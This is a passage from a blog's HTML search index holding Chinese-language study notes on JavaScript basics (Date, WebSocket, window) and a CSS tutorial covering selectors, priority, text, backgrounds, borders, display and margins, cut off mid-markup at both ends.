language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getDate</span>());  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 月（0~11）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getMonth</span>() + <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 年</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getFullYear</span>()); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 小时</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getHours</span>()); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 分钟</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getMinutes</span>()); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 秒</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getSeconds</span>()); </span><br></pre></td></tr></table></figure><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>与服务器建立全双工通信（两端都可以主动发起通信）</p><p><code>ajax</code>是用<code>http</code>，只能<strong>前端</strong>主动发起请求</p><ul><li>new WebSocket(‘ws://localhost:8080’);：建立ws连接。</li><li>send()：向服务器端发送一个字符串。一般用JSON将传入的对象序列化为字符串。</li><li>onopen：类似于onclick，当连接建立时触发。</li><li>onmessage：当从服务器端接收到消息时触发。</li><li>close()：关闭连接。</li><li>onclose：当连接关闭后触发。</li></ul><h3 id="window"><a href="#window" class="headerlink" title="window"></a>window</h3><ul><li><code>window.open(&quot;https://www.acwing.com&quot;)</code>：在新标签栏中打开页面。</li><li><code>location.reload()</code>：刷新页面。</li><li><code>location.href = &quot;https://www.acwing.com&quot;</code>：在当前标签栏中打开页面。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://www.dqywy.top&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="title function_">reload</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;https://www.dqywy.top&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="canvas"><a href="#canvas" class="headerlink" title="canvas"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial">canvas</a></h3>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS笔记</title>
      <link href="/post/1822a0ce.html"/>
      <url>/post/1822a0ce.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>用冒号赋值</li><li>分号结尾</li><li>要写单位px</li><li>对行内元素，宽度默认为整行，<strong>高度默认为0</strong></li><li>css多属性顺序：上-右-下-左，没取的一项取对边值</li></ul><h3 id="行内样式"><a href="#行内样式" class="headerlink" title="行内样式"></a>行内样式</h3><ul><li>只修改一个标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./static/images/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 300px;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内部样式"><a href="#内部样式" class="headerlink" title="内部样式"></a>内部样式</h3><ul><li>修改一个页面的一类标签</li><li>border-radius：将边角变圆弧</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-radius</span>: <span class="number">5%</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./static/css/style.css&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="CSS-1"><a href="#CSS-1" class="headerlink" title="CSS"></a>CSS</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>; </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: medium;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.color</span>,</span><br><span class="line"><span class="selector-class">.big</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightgreen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.big</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: medium;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ID选择器"><a href="#ID选择器" class="headerlink" title="ID选择器"></a>ID选择器</h3><ul><li>一个id只对应一个标签</li><li>css中#开头</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;my-id&quot;</span>&gt;</span>id<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">#my-id &#123;</span><br><span class="line">    color: red;</span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 30px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类选择器class"><a href="#类选择器class" class="headerlink" title="类选择器class"></a>类选择器class</h3><ul><li>跨标签</li><li>css中.开头</li><li>同时定义多个class属性使用逗号隔开</li><li>同时使用多个class使用空格隔开</li></ul><h3 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h3><ul><li>状态选择器</li><li><code>id</code>和<code>class</code>都可以使用</li><li><code>:link</code>对应未点击的展示</li><li><code>:visited</code>对应点击后的展示</li><li><code>:hover</code>对应鼠标悬停的展示</li><li><code>:active</code>对应鼠标按住的展示</li><li><code>:focus</code>对应输入框聚焦(开始输入)的展示</li></ul><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;effect&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>hover</code>表示当鼠标悬停在上面的情况下</li><li><code>transform scale</code>表示大小变化</li><li><code>transition</code>表示该变化完成的时间</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.effect</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightcoral;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">200ms</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><ul><li>num是从该标签所处的父节点开始计算</li><li><code>p:nth-child(2)</code>：遍历每一个p标签，判断其是否满足num=2</li><li><code>p:nth-child(odd)</code>：遍历每一个p标签，判断其是否满足num为奇数</li><li><code>p:nth-child(even)</code>：遍历每一个p标签，判断其是否满足num为偶数  </li><li><code>p:nth-child(3n)</code>：遍历每一个p标签，判断其是否满足num为3的倍数  </li><li><code>p:nth-child(a*n + b)</code>：遍历每一个p标签，判断其是否满足num=a*n+b(n为非负整数)  </li></ul><p>下面的代码会选中p2和p4</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">p:nth-child(2) &#123;</span><br><span class="line">    background-color: blanchedalmond;</span><br><span class="line">    font-size: 30px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>target</code>表示该标签被选中：</p><ul><li>该元素会被放到页面最顶端(如果下面内容足够的话)</li><li>url会变为<code>http://dqywy.top#my-id</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:target</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.2</span>);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">300ms</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>, </span><br><span class="line"><span class="selector-tag">p</span>, </span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* div标签且同时具有big类和color类才会触发 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.big</span><span class="selector-class">.color</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.2</span>);</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* id为my-item且同时具有big类和color类才会触发 */</span></span><br><span class="line"><span class="selector-id">#my-item</span><span class="selector-class">.big</span><span class="selector-class">.color</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.2</span>);</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h3><ul><li><code>*</code></li><li><code>p[id]</code>：具有id属性的p标签</li><li><code>p[type=text]</code></li></ul><h3 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 每个p标签的第一个字符 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 每个p标签的第一行 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 被选中的p标签 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* h1标签的前后分别添加内容 */</span></span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;《&quot;</span>;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;》&quot;</span>;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><ul><li>先来后到：后面定义的样式会覆盖前面定义的样式</li><li>越具体越优先：全局选择器 &lt; 标签选择器 &lt; class选择器 &lt; id选择器 &lt; 行内样式表</li><li>权重 &gt; 次序</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将height临时设置为最高优先级 */</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span> <span class="meta">!important</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><ul><li>单词</li><li>16进制</li><li>RGB</li><li>RGBA</li><li>取色：网页内<code>ctrl+shift+c</code>快速选中；QQ截图+<code>ctrl+c</code>复制16进制色号</li></ul><h2 id="文本-文字"><a href="#文本-文字" class="headerlink" title="文本/文字"></a>文本/文字</h2><p>子标签会继承父标签的文本属性</p><h3 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h3><h4 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h4</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 左右对齐，多行起作用 */</span></span><br><span class="line"><span class="selector-class">.mydiv</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: justify;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="竖直居中"><a href="#竖直居中" class="headerlink" title="竖直居中"></a>竖直居中</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 行高 */</span></span><br><span class="line"><span class="attribute">line-height</span> = 元素高度</span><br></pre></td></tr></table></figure><h3 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h3><p>如果要兼容价大屏幕就要少用固定单位px</p><ul><li><code>px</code></li><li><code>%</code>：相对于父元素的比例</li><li><code>em</code>：相对于当前属性的倍数</li><li><code>rem</code>：相对于根元素属性的倍数</li><li><code>vw</code>：当前屏幕宽度的百分比</li><li><code>vh</code>：当前屏幕高度的百分比</li></ul><h3 id="字间距"><a href="#字间距" class="headerlink" title="字间距"></a>字间距</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">letter-spacing</span>: <span class="number">0.1em</span>;</span><br></pre></td></tr></table></figure><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 两个字 */</span></span><br><span class="line"><span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br></pre></td></tr></table></figure><h3 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h3><p><a href="https://developer.mozilla.org/zh-CN/">MDN</a>搜索<code>text-decoration</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 去掉链接下划线 */</span></span><br><span class="line"><span class="attribute">text-decoration</span>: none;</span><br></pre></td></tr></table></figure><h3 id="文本阴影"><a href="#文本阴影" class="headerlink" title="文本阴影"></a>文本阴影</h3><ul><li>x方向偏移</li><li>y方向偏移</li><li>模糊半径(可省)</li><li>阴影颜色</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">text-shadow</span>: <span class="number">1.5px</span> <span class="number">1px</span> <span class="number">2px</span> lightcoral;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 可以操作多次 */</span></span><br><span class="line"><span class="attribute">text-shadow</span>: <span class="number">1.5px</span> <span class="number">1px</span> <span class="number">2px</span> lightcoral,</span><br><span class="line">            -<span class="number">1.5px</span> -<span class="number">1px</span> <span class="number">2px</span> lightcoral;</span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ul><li><code>font-size</code></li><li><code>font-style</code></li><li><code>font-weight</code>: 数值没有单位，不是px</li><li><code>font-family: monospace</code> 等宽字体</li><li><code>font-face</code>：引入外部字体</li></ul><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.mydiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">700px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="comment">/* 背景图片 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">../images/background.jpg</span>),</span><br><span class="line">                      <span class="built_in">url</span>(<span class="string">../images/logo.jpg</span>);</span><br><span class="line">    <span class="comment">/* 背景使用渐变色 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(lightblue, lightcoral);</span><br><span class="line">    <span class="comment">/* 背景大小 */</span></span><br><span class="line">    <span class="comment">/* 50% 100% */</span></span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">700px</span> <span class="number">500px</span>,</span><br><span class="line">                     cover;</span><br><span class="line">    <span class="comment">/* 背景颜色 */</span>          </span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">    <span class="comment">/* 图片是否重复 */</span></span><br><span class="line">    <span class="comment">/* repeat-x */</span></span><br><span class="line">    <span class="comment">/* repeat-y */</span></span><br><span class="line">    <span class="comment">/* no-repeat */</span></span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="comment">/* 背景位置 */</span></span><br><span class="line">    <span class="comment">/* right top */</span></span><br><span class="line">    <span class="comment">/* left bottom */</span></span><br><span class="line">    <span class="attribute">background-position</span>: left top,</span><br><span class="line">                         center top;</span><br><span class="line">    <span class="comment">/* 背景是否随标签一起在页面滚动 */</span></span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="comment">/* 背景透明度, 对颜色和图片都会起作用 */</span></span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border-style</span>: solid;</span><br><span class="line"><span class="attribute">border-width</span>: <span class="number">4px</span>;</span><br><span class="line"><span class="attribute">border-color</span>: black;</span><br><span class="line"><span class="comment">/* radius可以定义很多不规则图形-MDN */</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">15px</span>;</span><br><span class="line"><span class="comment">/* 边框重合-不常用 */</span></span><br><span class="line"><span class="attribute">border-collapse</span>: collapse;</span><br></pre></td></tr></table></figure><h2 id="展示格式"><a href="#展示格式" class="headerlink" title="展示格式"></a>展示格式</h2><p>注意：<strong>元素宽度和高度=content+内边距padding+边框border+外边距margin</strong></p><h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">display</span>: inline;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line"><span class="attribute">display</span>: inline-block;</span><br></pre></td></tr></table></figure><h4 id="block"><a href="#block" class="headerlink" title="block"></a>block</h4><ul><li>独占一行</li><li><code>width</code>: 100%</li></ul><h4 id="inline"><a href="#inline" class="headerlink" title="inline"></a>inline</h4><ul><li>共用一行</li><li>宽度=内容宽度</li><li>设置<code>width</code>和<code>height</code>没有作用</li><li>只用水平方向的内外边距有作用</li></ul><h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><ul><li>常见：<code>img</code></li><li>可以共占一行</li><li>宽高可设置</li></ul><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>设置超出部分的内容</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 超出部分使用滚轮 */</span></span><br><span class="line"><span class="attribute">overflow</span>: auto;</span><br><span class="line"><span class="comment">/* 隐藏超出部分 */</span></span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"><span class="comment">/* 关闭横向滚轮 */</span></span><br><span class="line"><span class="attribute">overflow-x</span>: hidden;</span><br><span class="line"><span class="comment">/* 关闭纵向滚轮 */</span></span><br><span class="line"><span class="attribute">overflow-y</span>: hidden;</span><br></pre></td></tr></table></figure><h3 id="text-overflow"><a href="#text-overflow" class="headerlink" title="text-overflow"></a>text-overflow</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 超出部分使用...代替（用户名过长） */</span></span><br><span class="line"><span class="attribute">text-overflow</span>: ellipsis;</span><br></pre></td></tr></table></figure><h2 id="边距"><a href="#边距" class="headerlink" title="边距"></a>边距</h2><p>注意：<strong>避免在两个方向上对同一边距的定义</strong></p><h3 id="外边距"><a href="#外边距" class="headerlink" title="外边距"></a>外边距</h3><p>该属性定义的是外边距<strong>至少</strong>是多少——相邻的外边距取最大值</p><ul><li><code>margin</code></li><li><code>margin-top</code></li><li><code>margin-right</code></li><li><code>margin-bottom</code></li><li><code>margin-left</code>  </li></ul><p><strong>注</strong>：</p><ul><li>没有提供默认使用对面的值</li><li>父元素没有定义边框的话会与子元素合并使用，可以对父元素使用如下代码</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div-outer</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内边距"><a href="#内边距" class="headerlink" title="内边距"></a>内边距</h3><figure 